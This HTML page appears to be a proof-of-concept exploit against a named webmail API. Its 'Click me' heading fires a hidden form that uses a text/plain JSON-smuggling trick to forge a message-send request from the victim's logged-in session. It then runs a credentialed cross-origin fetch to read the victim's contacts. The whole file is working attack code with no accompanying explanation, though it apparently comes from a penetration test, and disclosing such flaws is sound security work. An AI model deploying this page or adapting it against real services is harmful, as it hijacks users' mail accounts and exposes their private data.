<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <script>

        window.addEventListener("message", (e) => {
            console.log(e?.data);
        }, false);

    </script>
</head>
<body>
<script>history.pushState('', '', '/')</script>
<script>

    function go(){
        let w = window.open("https://api-mail.timeweb.com/contact",'');
        setTimeout(function(){
            w.close();
            document.getElementsByName('csrf')[0].submit();
            fetch('https://api-mail.timeweb.com/contact',{
                mode: 'cors',
                credentials: 'include',
            })
            .then(response => response.json())
            .then(response => {
                console.log({data: response});

            })

        },1000)
    }
</script>

<h1 onclick=go()>Click me</h1>

<form style="display:none" name=csrf
      enctype="text/plain"
      method=post action="https://api-mail.timeweb.com/message/send">

    <input
            hidden="true"
            type="text"
            name="{&quot;attachments&quot;:[],&quot;bcc&quot;:[],&quot;cc&quot;:[],&quot;text&quot;:&quot;1&quot;,&quot;htmlText&quot;:&quot;Pwned&quot;,&quot;subject&quot;:&quot;Pwned&quot;,&quot;to&quot;:[&quot;zero.0x00.pentest_04@twmail.ru&quot;],&quot;from&quot;:[],&quot;replyMessageId&quot;:0,&quot;resendMessageIds&quot;:[],&quot;resendAttachments&quot;:[],&quot;pwned"
            value="&quot;:1}"
    >
    <input type=submit>
</form>


</body>
</html>
